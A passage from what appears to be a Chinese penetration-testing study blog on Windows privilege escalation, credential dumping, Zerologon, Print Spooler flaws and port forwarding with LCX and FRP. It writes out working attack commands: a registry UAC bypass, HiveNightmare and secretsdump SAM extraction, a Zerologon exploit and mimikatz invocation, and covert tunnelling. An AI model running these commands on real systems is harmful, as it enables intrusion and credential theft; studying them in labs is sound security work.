/f<br></code></pre></td></tr></table></figure><p>执行上面命令后就会在注册表HKCU\Software\Classes\ms-settings\shell\open\command（如果没有就创建）中将要执行的攻击载荷路径分别写入默认值和DelegateExecute值。标准用户对注册表键值有修改权限，并且对HKCU的修改会自动同步到HKCR</p><p><img src="http://cdn.clown2024.cn/202407151448429.png" alt="image-20240406174941120"></p><p>这时候再次运行ComputerDefaults.exe时，恶意程序就会随着该程序的启动绕过UAC并以高权限运行，如下图：</p><p><img src="http://cdn.clown2024.cn/202407151448430.png" alt="image-20240406175124818"></p><p>上线MetaSploit之后，执行getsystem命令可直接提升至SYSTEM权限</p><p><img src="http://cdn.clown2024.cn/202407151448431.png" alt="image-20240406175217578"></p><h2><span id="dll劫持">DLL劫持</span></h2><p>DLL就是动态链接库，在程序运行的时候相关的DLL就会被加载进对应程序进程的内存空间，当我们能够通过一些手段让程序执行任意的DLL，就会造成DLL劫持。</p><p>应用程序加载DLL时，没有指定绝对路径就会以下面的路径搜索DLL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">程序安装目录==》系统目录(C:\Windows\System32)==》16位系统目录(C:\Windows\System)==》Windows目录(C:\Windows)==》当前工作目录==》PATH环境变量中列出的各目录<br></code></pre></td></tr></table></figure><p>DLL劫持的原理就是将我们的同名恶意DLL文件放在合法DLL文件的搜索路径之前，程序就会优先加载我们的恶意DLL，造成DLL劫持；利用的前提是拥有对上述目录的写入权限，并且恶意 DLL 需要与原始 DLL拥有相同的导出表函数。</p><h2><span id="模拟可信任目录">模拟可信任目录</span></h2><p>当系统允许程序自动提升权限时，需要满足下面三个条件，任何一个条件不通过都会被系统拒绝：</p><ol><li>检查可执行文件的 Manifest 信息autoElevate属性字段的值为True</li><li>检查可执行文件的签名</li><li>检查可执行文件是否位于系统可信任目录中</li></ol><p>系统在检查可信任目录时，相关函数会去掉可执行文件路径中的空格，所以我们可以借助该特性来绕过第三个条件，比如文件位于”C:\Windows \System32”。</p><blockquote><p>基于此原理，测试人员根据可信任目录来创建一个包含尾随空格的模拟可信任目录将一个白名单程序复制到模拟可信任目录中，配合 DIL劫持等技术即可成功绕过 UAC。</p></blockquote><p>大致攻击流程如下：</p><ol><li><p>先创建模拟可信任目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">md &quot;\\?\C:\Windows &quot;<br>md &quot;\\?\C:\Windows \System32&quot;<br>copy C:\Windows\System32\WinSAT.exe &quot;\\?\C:\Windows \System32\WinSAT.exe&quot; #这里复制白名单程序到模拟可信任目录<br><span class="hljs-meta prompt_">#</span><span class="language-bash">\\?\前缀是为了保证路径解析正确</span><br></code></pre></td></tr></table></figure></li><li><p>启动该白名单程序用Process Monitor检测其进程所加载的DLL</p><p>然后选择一个DLL进行劫持，注意构造的恶意DLL文件需要与原来的DLL具有相同的导出函数。可以使用**ExportsToC++**工具来获取原DLL文件导出的函数并自动生成C++代码。</p><p><img src="http://cdn.clown2024.cn/202407151448432.png" alt="image-20240410000758252"></p></li><li><p>简单修改生成代码，在DLLMain入口函数加入要执行的操作，然后编译生成64位的DLL文件</p><p><img src="http://cdn.clown2024.cn/202407151448433.png" alt="image-20240410000823674"></p></li><li><p>将生成DLL文件放入模拟可信任目录再运行白名单程序即可。</p></li></ol><h2><span id="相关辅助工具">相关辅助工具</span></h2><p><strong>UACME</strong></p><p>UACME是一个专用于绕过 WindowsUAC的开源项目,目前已包含了70多种 BypassUAC的方法，项目地址：<a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><p>在UACME项目中，每种BypassUAC 的方法都有一个数字编号，由一个名为Akagi.exe(需要自行编译生成)的主程序进行统一调用，相关命令如下:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">akagi.exe [Key] [Param]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Key，指定要使用的方法的编号</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Param，指定绕过 UAC后要运行的程序或命令，默认启动一个关闭了 UAC的 CMD 窗口</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">命令示例如下</span><br>Akagi.exe 23 C:\Windows\System32\cmd.exe<br></code></pre></td></tr></table></figure><p><strong>MetaSploit</strong></p><p>MetaSploit也有内置用于绕过UAC的模块</p><p><img src="http://cdn.clown2024.cn/202407151448434.png" alt="image-20240410001516563"></p><p>成功利用这些模块，将得到一个关闭了UAC保护的 Meterpreter,然后执行 getsystem命令，可直接提升至SYSTEM权限。</p><h1><span id="用户凭据操作">用户凭据操作</span></h1><h2><span id="枚举unattended凭据">枚举Unattended凭据</span></h2><p>无人值守(Unattended)安装允许应用程序在不需要管理员关注下自动安装。无人值守安装的问题是会在系统中残留一些配置文件，其中可能包含本地管理员的用户名和密码，常见的路径如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C:\sysprep.inf<br>C:\syspreg\sysprep.xml<br>C:\Windows\system32\sysprep.inf<br>C:\Windows\system32\sysprep\sysprep.xml<br>C:\unattend.xml<br>C:\Windows\Panther\Unattend.xml<br>C:\Windows\PantheriUnattended.xml<br>C:\Windows\PantheriUnattendiUnattended.xml<br>C:\Windows\Panther\Unattend\Unattend.xml<br>C:\Windows\System32\Sysprep\Unattend.xml<br>C:\Windows\System32\Sysprep\PantherUnattend.xml<br></code></pre></td></tr></table></figure><p>可以全盘搜索上述配置文件，并检索User、Accounts、UserAccounts、LocalAccounts、Administrator、Password等关键字来获取管理员凭据。</p><p>MetaSploit 提供了 post&#x2F;windows&#x2F;gather&#x2F;enum_unattend 模块，可以从 Unattend 配置文件中自动化检索出用户密码</p><p><img src="http://cdn.clown2024.cn/202407151448435.png" alt="image-20240410002428433"></p><h2><span id="获取组策略凭据">获取组策略凭据</span></h2><p>微软在 Windows Server 2008中引入了组策略首选项，允许网络管理员对指定计算机和用户配置特定的设置。<br>在大型企业或组织的域环境中，网络管理员往往会通过下发组策略的方式对所有加入域的计算机的本地管理员密码进行批量修改。</p><p><img src="http://cdn.clown2024.cn/202407151448436.png" alt="image-20240410003626595"></p><p>在新建一个组策略后，域控制器会自动在SYSVOL 共享目录中生成一个XML 文件该文件保存了组策略更新后的密码。SYSVOL是在安装活动目录时创建的一个用于存储公共文件服务器副本的共享文件夹，主要存放登录脚本、组策略数据及其他域控制器需要的域信息，并在所有经过身份验证的域用户活域信任用户范围内共享</p><p><img src="http://cdn.clown2024.cn/202407151448437.png" alt="image-20240410003755692"></p><p>改目录中一个Groups.xml文件，其中的cpassword字段保存了AES256加密后的用户密码</p><p><img src="http://cdn.clown2024.cn/202407151448438.png" alt="image-20240410003851164"></p><p>但是后来微软在2012年公布了加密私钥，所以经过认证的用户都可以读取并解密出来。</p><p>MetaSploit 框架内置 post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp 模块，可以自动化搜索位于SYSVOL共享目录中的XML，并从中解密出用户密码</p><p><img src="http://cdn.clown2024.cn/202407151448439.png" alt="image-20240410004027561"></p><h2><span id="hivenightmare">HiveNightmare</span></h2><p>2021年7月，Microsoft发布紧急安全公告，公开了一个Windows 提权漏洞(CVE-2021-36934)。由于 Windows中多个系统文件的访问控制列表(ACL)过于宽松使得任何标准用户都可以从系统卷影副本中读取包括SAM、SYSTEM、SECURITY 在内的多个系统文件。由于SAM 文件是存储用户密码哈希值的安全账户管理器，进而可以获取所有本地用户 NTLM Hash值，通过暴力破解或哈希传递等方法就能实现本地权限提升。</p><p>该漏洞利用需要满足三个条件：</p><ol><li>已启用系统保护(默认启用)</li><li>系统上存在已创建的系统还原点</li><li>系统启用本地管理员用户</li></ol><blockquote><p>Windows系统保护：是Windows操作系统的一个功能，旨在保护计算机的系统文件和设置免受意外更改或恶意软件的损害。它通过创建系统还原点和监控系统文件的完整性来实现这一目标。</p><p>具体来说，Windows系统保护有两个主要功能：</p><ol><li>系统还原点：Windows系统保护会定期创建系统还原点，这是计算机在某个时间点的快照。当计算机遇到问题或系统文件损坏时，可以使用系统还原点将系统还原到先前的正常状态。系统还原点记录了操作系统、驱动程序和注册表的状态，而不会影响个人文件和数据。</li><li>文件完整性监控：Windows系统保护还会监控系统文件的完整性。它会定期扫描关键系统文件，验证其完整性，并修复任何被修改或损坏的文件。这有助于防止恶意软件或用户意外更改系统文件，从而确保系统的稳定性和安全性。</li></ol></blockquote><p>满足之后标准用户即可访问和转储SAM、SYSTEM、SECURITY文件，路径一般如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C:\Windows\System32\config\SAM<br>C:\Windows\System32\config\SECURITY<br>C:\Windows\System32\config\SYSTEM<br></code></pre></td></tr></table></figure><p>标准用户可以执行下面命令查看是否存在漏洞：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">icals C:\Windows\System32\config\SAM<br></code></pre></td></tr></table></figure><p>出现下面内容则表示存在该漏洞</p><p><img src="http://cdn.clown2024.cn/202407151448440.png" alt="image-20240410161153281"></p><p>然后将HiveNightmare.exe利用程序上传到目标主机直接运行就可以将这三个文件转储到当前目录，项目地址：<a href="https://github.com/GossiTheDog/HiveNightmare">https://github.com/GossiTheDog/HiveNightmare</a></p><p><img src="http://cdn.clown2024.cn/202407151448441.png" alt="image-20240410161632625"></p><p>最后使用Impacket 项目中的secretsdump.py导出 SAM 文件中的哈希值，项目地址：<a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python secretsdump.py -sam SAM-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> -system SYSTEM-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> -security SECURITY-<span class="hljs-number">2022</span>-01-<span class="hljs-number">18</span> LOCAL<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448442.png" alt="image-20240410161855268"></p><blockquote><p>用mimikatz也一样</p></blockquote><h2><span id="zerologon域内提权">Zerologon域内提权</span></h2><p>Zerologon(CVE-2020-1472)是Netlogon远程协议的一个特权提升漏洞，可以在不提供任何凭据的情况下通过身份验证，并实现域内提权。</p><p><strong>Netlogon协议</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Netlogon远程协议是一种用于Windows操作系统的网络通信协议，用于处理域控制器和客户端计算机之间的身份验证和授权。它是Windows域环境中的核心协议之一。<br><br>Netlogon远程协议在Windows操作系统中使用以下两个常用端口：<br><br>TCP/UDP端口 445：这是SMB（Server Message Block）协议的默认端口，Netlogon远程协议在内部使用SMB进行通信。SMB是一种用于文件和打印共享以及远程管理的协议，Netlogon利用SMB来进行域控制器和客户端之间的身份验证和授权。<br><br>TCP/UDP端口 139：这是NetBIOS（Network Basic Input/Output System）的旧版端口，Netlogon在某些旧版本的Windows操作系统中可能使用该端口进行通信。然而，从Windows Vista和Windows Server 2008开始，默认情况下，Netlogon使用SMB协议的端口445。<br></code></pre></td></tr></table></figure><p>该漏洞的最常见的利用方法是调用Netlogon中的RPC函数 NetrServerPasswordSet2来重置域控制器的密码。注意，这里重置的是域控机器账户的密码，该密码由系统随机生成，密码强度是 120个字符，并且会定时更新。</p><p>机器用户拥有域用户的一切属性，在特定意义上也是一种域用户。域内的机器账户以“机器名+$”来命名如域控制器DC-1的机器用户就是DC-1$。</p><p>但是机器账户不允许登录，因此不能重置密码后直接登录，机器账户默认情况下拥有DCSync权限，因此可以通过 DCSync攻击导出域管理员密码的哈希值，进而获取域控权限。</p><p>攻击过程：</p><ol><li><p>重置域控密码</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 cve-2020-1472-exploit.py DC-1 10.10.10.11 #将域控的密码置空，该攻击脚本可以网上查找<br></code></pre></td></tr></table></figure></li><li><p>使用 secretsdump.py以空密码连接上域控，并导出域管理员的哈希值</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 secretdump.py hack-my.com/DC-1\$@10.10.10.11 -just-dc-user &quot;hack-my\administrator&quot; -no-pass<br></code></pre></td></tr></table></figure></li><li><p>然后执行哈希传递攻击获取域控的SYSTEM权限</p><p><img src="http://cdn.clown2024.cn/202407151448443.png" alt="image-20240410164025687"></p></li></ol><p>也可以使用mimikatz</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;lsadump::zerologon /target:10.10.10.11 /ntlm /null /account:Dc-1$/exploit&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/target，指定域控地址；/account，指定域控的机器账户</span><br></code></pre></td></tr></table></figure><p>攻击结束后还需要及时恢复域控密码，否则可能导致域控制器脱域。主要原因是域控 NTDS.dit 中存储的密码和域控本地注册表中存储的密码不一致。</p><ol><li><p>先导出本地注册表的值</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg save HKLM\SYSTEM system.save<br>reg save HKLM\SAM sam.save<br>reg save HKLM\SECURITY security.save<br></code></pre></td></tr></table></figure></li><li><p>使用secretsdump.py导出注册表中的哈希值</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<br></code></pre></td></tr></table></figure><p>箭头所指即当前机器用户密码</p><p><img src="http://cdn.clown2024.cn/202407151448444.png" alt="image-20240410164855235"></p></li><li><p>通过运行 CVE-2020-1472 中的 restorepassword.py 恢复域控密码</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">pvthon3 restorepassword.py hack-my.com/DC-1@DC-1 -target-ip 10.10.10.11 -hexpass &lt;导出的哈希值&gt;<br></code></pre></td></tr></table></figure></li></ol><p>也可以直接使用mimikaze恢复</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lsadump::postzerologon /target:hack-my.com /account:DC-1$<br></code></pre></td></tr></table></figure><h1><span id="print-spooler提权漏洞">Print Spooler提权漏洞</span></h1><p>Print Spooler 是 Windows 系统的打印后台处理服务，用来管理所有本地和网络打印队列，并控制所有打印工作。该服务在 Windows 中为默认开启状态</p><p><img src="http://cdn.clown2024.cn/202407151448445.png" alt="image-20240410165124444"></p><p><img src="http://cdn.clown2024.cn/202407151448446.png" alt="image-20240410165241804"></p><h2><span id="printdemon">PrintDemon</span></h2><p>2020年5月12日，微软发布安全更新补丁，公开了一个名为“PrintDemon”的本地提权漏洞(CVE-2020-1048)。由于 Windows Print Spooler 服务存在缺陷，用户可以在系统上写入任意文件，并可以借助其他方法提升权限。该漏洞广泛影响 Windows 系统的各版本。</p><h2><span id="printnightmare">PrintNightmare</span></h2><p>PrintNightmare 是广泛影响 Windows 系统各版本的严重安全漏洞，发生在 WindowsPrint Spooler 服务中，有两种变体，一种导致权限提升(CVE-2021-1675)，另一种允许远程代码执行(CVE-2021-34527)。</p><p>标准用户可以通过 PrintNightmare 漏洞绕过 PfcAddPrinterDriver 的安全验证,并在打印服务器中安装恶意的驱动程序。若当前所控制的用户在域中，则可以连接到域控制器中的 Print Spooler 服务并在域控制器中安装恶意的驱动程序，进而接管整个域环境。</p><h1><span id="certifried域内提权">Certifried域内提权</span></h1><p>2022年5月10日，微软发布补丁修复了一个Active Directory 域权限提升漏洞(CVE-2022-26923)。该漏洞是由于对用户属性的不正确获取，允许低权限用户在安装了活动目录证书服务(Active Directory Certificate Services，AD CS)服务器角色的活动目录环境中将权限提升至域管理员。</p><h2><span id="活动目证书服务">活动目证书服务</span></h2><p>活动目录证书服务(AD CS)是微软对PKI(PublicKey Infrastructure，公钥基本结构)的实现，与现有的活动目录森林集成，并提供从加密文件系统到数字签名，再到客户端身份验证等一切功能。虽然默认情况下没有为活动目录环境安装活动目录证书服务，但活动目录证书服务如今已在各大企业和组织中被广泛部署。</p><p>PKI 是用来实现证书的产生、管理、存储、分发和撤销等功能，可以理解为一套解决方案，其中需要有证书颁发机构，具有证书发布、证书撤掉等功能。</p><h2><span id="活动目录证书注册流程">活动目录证书注册流程</span></h2><p>要从活动目录证书服务(ADCS)获取证书，客户端需经过注册流程</p><p><img src="http://cdn.clown2024.cn/202407151448447.png" alt="image-20240411002111319"></p><p><strong>CA证书是什么</strong></p><p>CA证书是由权威的数字证书授权中心（Certification Authority，简称CA）签发的一种数字证书。CA证书用于验证和确认公钥的所有者身份，确保通信的安全性和可信度。</p><p><strong>CA证书包含以下关键信息：</strong></p><ol><li>公钥：CA证书包含一个公钥，用于加密和验证数字签名。</li><li>主体信息：CA证书中包含证书的拥有者（通常是个人、组织或设备）的身份信息，如姓名、组织名称、电子邮件地址等。</li><li>有效期：CA证书具有一个指定的有效期，即证书的生效日期和过期日期。在有效期内，证书可以用于加密、解密和验证数字签名。</li><li>签名算法和签名值：CA使用其私钥对证书的信息进行数字签名，以确保证书的完整性和真实性。证书中包含了签名值和用于生成签名的算法信息。</li></ol><p><strong>CA证书的工作原理如下：</strong></p><ol><li>证书请求：申请者生成一个证书请求（Certificate Signing Request，简称CSR），包含其公钥和身份信息。CSR提交给CA以申请证书。</li><li>CA验证：CA对申请者的身份进行验证，并确认其公钥的真实性。验证可以通过多种方式进行，如身份验证、域名验证等。</li><li>签发证书：经过验证后，CA使用自己的私钥对证书请求进行数字签名，生成最终的CA证书。</li><li>证书分发：CA将签发的证书发送给申请者。申请者可以将该证书用于加密通信、数字签名验证等操作。</li></ol><blockquote><p>CA证书的作用是建立数字身份和建立信任链。由于CA是被广泛认可和信任的权威机构，其签发的证书能够验证证书持有者的身份，确保通信的安全性和可信度。客户端可以验证服务器的CA证书，确保与其通信的服务器是合法和可信赖的。</p><p>在Web安全领域，CA证书也用于HTTPS协议，用于验证网站的真实性和建立安全的加密通信通道。</p></blockquote><p><strong>注册流程</strong></p><p>概括地说，在注册期间，客户端首先根据活动目录Enrollment Services 容器中的对象找到企业 CA，然后生成一个公钥&#x2F;私钥对，并将公钥、证书主题和证书模板名称等其他详细信息一起放入证书签名请求(Certificate SigningRequest，CSR)消息。客户端使用其私钥签署 CSR，并将 CSR发送到企业 CA 服务器。CA 服务器检查客户端是否可以请求证书，如果是，就会通过查找CSR 中指定的证书模板 AD 对象来确定是否会颁发证书CA 将检查证书模板 AD对象的权限是否允许该账户获取证书，如果是，就将使用证书模板定义的“蓝图”设置(如EKU、加密设置和颁发要求等)并使用 CSR中提供的其他信息(如果证书的模板设置允许)生成证书。CA使用其私钥签署证书，然后返回给客户端。</p><p>CA 颁发的证书可以提供加密(如加密文件系统)、数字签名(如代码签名)和身份验证(如对AD)等服务。</p><h2><span id="漏洞分析">漏洞分析</span></h2>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-端口转发和代理</title>
      <link href="/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/"/>
      <url>/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1><span id="端口转发和代理">端口转发和代理</span></h1><p>在渗透测试中，在获取目标外网权限后，需要通过转发端口或搭建代理等方式建立内网通道。</p><h2><span id="正向连接与反向连接">正向连接与反向连接</span></h2><p>两个基本概念：<strong>正向连接和反向连接</strong>。例如，Metasploit 大致可以分为两种Meterpreter，一种是以 windows&#x2F;meterpreter&#x2F;bind_tcp为代表的 Bind Shell,另一种是以 windows&#x2F;meterpreter&#x2F;reverse_tcp 为代表的 Reverse Shell。其中，Bind Shell用于正向连接，而ReverseShell用于反向连接。</p><ul><li><p>正向连接：正向连接就是受控端主机监听一个端口，由控制端主机主动去连接受控端主机的过程，适用于受控主机具有公网IP的情况下。例如下图中，Attacker 和 Victim 主机都具有公网 IP，Attacker 可以直接通过IP地址访问到 Victim，所以能够使用正向连接来控制 Victim。</p><p><img src="http://cdn.clown2024.cn/202407151711902.png" alt="image-20240325091556352"></p></li><li><p>反向连接：反向连接是控制端主机监听一个端口，由受控端主机反向去连接控制端主机的过程适用于受控端主机没有公网 IP 的情况。如图所示，Victim 是一台位于内网并且没有公网 IP 的主机，Attacker 无法直接通过IP地址访问到 Victim。所以此时需要在Attacker 上监听一个端口，让 Victim 去反向连接 Attacker，从而实现对 Victim 的控制。</p><p><img src="http://cdn.clown2024.cn/202407151711903.png" alt="image-20240325092227731"></p></li></ul><h2><span id="端口转发">端口转发</span></h2><p>端口转发(Port Forwarding)是网络地址转换(NAT)的一种应用。通过端口转发，一个网络端口上收到的数据可以被转发给另一个网络端口。转发的端口可以是本机的端口，也可以是其他主机上的端口。</p><p>在现实环境中，内网部署的各种防火墙和入侵检测设备会检查敏感端口上的连接情况，如果发现连接存在异样，就会立即阻断通信。通过端口转发，设置将这个被检测的敏感端口的数据转发到防火墙允许的端口上，建立起一个通信隧道，可以绕过防火墙的检 测并与指定端口进行通信。</p><p>端口映射(Port Mapping)也是网络地址转换(NAT)的一种应用，用于把公网的地址翻译成私有地址。端口映射可以将外网主机收到的请求映射到内网主机上，使得没有公网IP地址的内网主机能够对外提供相应的服务。</p><h2><span id="socks代理">SOCKS代理</span></h2><p>SOCKS 全称为 Protocol For Sessions Traversal Across Firewall Securely，是一种代理协议，其标准端口为1080。SOCKS代理有SOCKS4和SOCKS5两个版本，SOCKS4只支持 TCP，而 SOCKS5 在SOCKS4的基础上进一步扩展，可以支持 UDP 和各种身份验证机制等协议。采用 SOCKS协议的代理服务器被称为SOCKS服务器，这是一种通用的代理服务器，在网络通信中扮演着一个请求代理人的角色。在内网渗透中，通过搭建SOCKS代理，可以与目标内网主机进行通信，避免多次使用端口转发。</p><h1><span id="常见转发与代理工具">常见转发与代理工具</span></h1><h2><span id="lck">LCK</span></h2><p>LCX是一款十分经典的内网端口转发工具，基于Socket套接字，具有端口转发和端口映射的功能。但是目前很多杀毒软件已经将LCX加入了特征库，在实际利用时需要自行做免杀处理。</p><p>这里网上找到了一个免杀处理过的：<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><ol><li><p>目标有公网IP</p><p>如图，假设win_server2012是一台具有公网IP地址的Web服务器。</p><p><img src="http://cdn.clown2024.cn/202407151711904.png" alt="image-20240325100613263"></p><p>假设此时已经获取了 WindowsServer 2012的控制权,需要登录其远程桌面查看情况,但是防火墙对 3389端口做了限制，不允许外网机器对 3389端口进行连接。那么，通过端口转发，可以将3389端口转发到其他防火墙允许的端口上，如4444端口，执行下面命令即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lck.exe -tran 4444 127.0.0.1:3389<br></code></pre></td></tr></table></figure><p>然后通过连接 Windows Server 2012的4444端口，即可成功访问其远程桌面</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">rdesktop 192.168.2.13:4444<br></code></pre></td></tr></table></figure></li><li><p>端口映射</p><p>测试环境如图所示。右侧的 Web 服务器(Windows Server 2012)有两个网卡分别连通外网和内网,分别为公网 IP(模拟)地址 192.168.2.13 和内网 IP 地址 10.10.10.13。内网还存在一台 MySQL 服务器。左侧的KaliLinux为测试人员的主机。</p><p>假设已经获取 Windows Server 2012的控制权，经过信息收集，获得内网中 MySQL服务器的 SSH 登录凭据，接下来需要登录这台服务器。但是服务器位于内网，无法直接通过 IP 地址进行访问，所以需要通过端口映射，将 MySOL 服务器的 22 端口映射到Windows Server 2012</p><p><img src="http://cdn.clown2024.cn/202407151711905.png" alt="image-20240325103859627"></p><p>在win_server2012执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lcx.exe -tran 2222 10.10.10.15 22<br></code></pre></td></tr></table></figure><p>然后连接win_server2012的2222端口，即可访问MySQL服务器</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh root@192.168.2.13 -p 2222<br></code></pre></td></tr></table></figure></li><li><p>目标无公网IP</p><p>测试环境如图所示。右侧的 Web服务器(Windows Server 2012)没有公网 IP地址，通过 NAT 对外提供 Web 服务，左侧的 Ubuntu 20.04为测试人员的公网 VPS。</p><p><img src="http://cdn.clown2024.cn/202407151711906.png" alt="image-20240325105824042"></p></li></ol><p>先在vps上执行下面命令监听本地4444端口，并将8888端口上接收到的数据转发给本机的4444端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./lck -listen 4444 8888<br></code></pre></td></tr></table></figure><p>然后在 Windows Seryer 2012上执行以下命令,控制 Windows Server 2012 去连接 VPS的8888端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lcx.exe -slave 192.168.2.x8888 127.0.0.1 3389<br></code></pre></td></tr></table></figure><p>然后连接vps的4444端口即可访问远程桌面</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">rdesktop 192.168.2.x:4444<br></code></pre></td></tr></table></figure><h2><span id="frp">FRP</span></h2><p>FRP 是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS 等协议，可以将内网服务以安全、便捷的方式，通过具有公网 IP 节点的中转暴露到公网。在进行内网渗透中，FRP 是一款常用的隧道工具除此之外，FRP支持搭建SOCKS5代理应用。项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><blockquote><p> 最新的frp似乎不再采用frpc.ini和frps.ini配置文件了，而是.toml后缀的文件。</p><p>具体使用去看官方的说明。我这里还是用回旧的方便学习</p></blockquote><p><strong>现在利用FRP搭建一个SOCKS5代理</strong></p><p>书中的测试环境如下：</p><p><img src="http://cdn.clown2024.cn/202407151711907.png" alt="image-20240325164452772"></p><blockquote><p>书中搭建了三级代理，这里来说一下多级代理的意思</p><p>首先控制了WinServer2012这台主机，然后上传frp客户端，攻击者用一台vps作为服务端，这样就可以访问到WinServer2012服务器，此时就构建了一层代理。</p><p>然后在WinServer2012起一个frp服务端，上传frp客户端到办公区的服务端，然后再构建一级代理，这样攻击者就能跳两次访问到办公区，这就是二级代理，后面一次类推</p></blockquote><p>这里我只能复现他的一级代理了，没那么多的服务器。我这里用一台kali机器，一台Win7，一台WinServer2012来实验；</p><p>Win7有两张网卡，可以连接处于内网的WinServer2012</p><p><strong>Win7：</strong></p><p><img src="http://cdn.clown2024.cn/202407151711908.png" alt="image-20240414104302628"></p><p><strong>WinServer2012</strong></p><p><img src="http://cdn.clown2024.cn/202407151711909.png" alt="image-20240414104340318"></p><p>假设现在已经控制了Win7，我们就可以先搭建一级代理来访问WinServer2012</p><ol><li><p>使用kali机器作为FRP的服务端，执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./frps -c ./frps.ini<br></code></pre></td></tr></table></figure><p>配置文件如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bind_addr = 192.168.172.132 #服务器ip<br>bind_port = 7000  # 服务器上绑定的端口<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151711910.png" alt="image-20240414110044664"></p><p>可以看到已经成功启动了</p></li><li><p>现在使用Win7这台机器进行配置</p><p>然后执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">.\frpc.exe -c .\frpc.ini<br></code></pre></td></tr></table></figure><p>配置文件如下：</p><p><img src="http://cdn.clown2024.cn/202407151711911.png" alt="image-20240414110253513"></p><blockquote><p>server_addr指向FRP服务端绑定的IP地址</p><p>server_port指向FRP服务端绑定的端口</p><p>remote_port为代理所使用的端口，会被转发到服务端</p><p>plugin为代理的类型</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151711912.png" alt="image-20240414110339382"></p></li></ol><p>现在就成功搭建了一级代理，可以看到socks代理连接成功</p><p><img src="http://cdn.clown2024.cn/202407151711913.png" alt="image-20240414110437717"></p><p>看一下攻击机开放的端口</p><p><img src="http://cdn.clown2024.cn/202407151711914.png" alt="image-20240414112044521"></p><p>然后，借助第三方工具，可以让计算机的其他应用使用这个 SOCKS5 代理,如ProxyChains、Proxifier 等。这里以 ProxyChains 为例进行演示(ProxyChains 是一款可以在 Linux 下实现全局代理的软件，可以使任何应用程序通过代理上网，允许TCP和 DNS 流量通过代理隧道，支持HTTP、SOCKS4、SOCK5类型代理)。</p><p>kali上直接使用下面命令安装即可：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt install proxychains4<br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://www.kali.org/tools/proxychains-ng/">https://www.kali.org/tools/proxychains-ng/</a></p><p>安装之后我们可以去配置&#x2F;etc下的proxychains.conf配置文件设置代理，最开始的socks记得要注释掉，因为是按顺序走代理的。</p><p><img src="http://cdn.clown2024.cn/202407151711915.png" alt="image-20240414111433628"></p><p>然后使用下面命令去远程连接WinServer2012，我们想要命令或应用使用代理只需要在最前面加上<code>proxychains4</code>或者<code>proxychains</code>即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">proxychains rdesktop 192.168.30.10<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151711916.png" alt="image-20240414114656744"></p><blockquote><p>不过一开始经常连接超时，后来直接把防火墙关了就成功了</p></blockquote><h2><span id="ssh隧道">SSH隧道</span></h2><p>参考文章：<a 